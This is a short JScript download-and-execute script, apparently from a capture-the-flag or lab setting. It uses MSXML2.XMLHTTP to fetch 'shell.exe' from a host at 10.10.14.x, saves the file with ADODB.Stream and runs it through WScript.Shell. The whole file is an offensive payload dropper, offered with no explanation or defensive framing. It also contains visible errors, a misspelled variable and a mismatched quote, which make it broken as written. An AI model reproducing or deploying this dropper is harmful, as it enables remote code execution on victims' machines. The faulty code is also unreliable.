var url = "http://10.10.14.x/shell.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
	var Steam = Wscript.CreateObject('ADODB.Stream');

	Stream.Open();
	Stream.Type = 1;
	Stream.Write(Object.ResponseBody);
	Stream.Position = 0;

	Stream.SaveToFile("shell.exe", 2);
	Stream.Close();
}

var r = new ActiveXObject(WScript.Shell").Run("shell.exe");
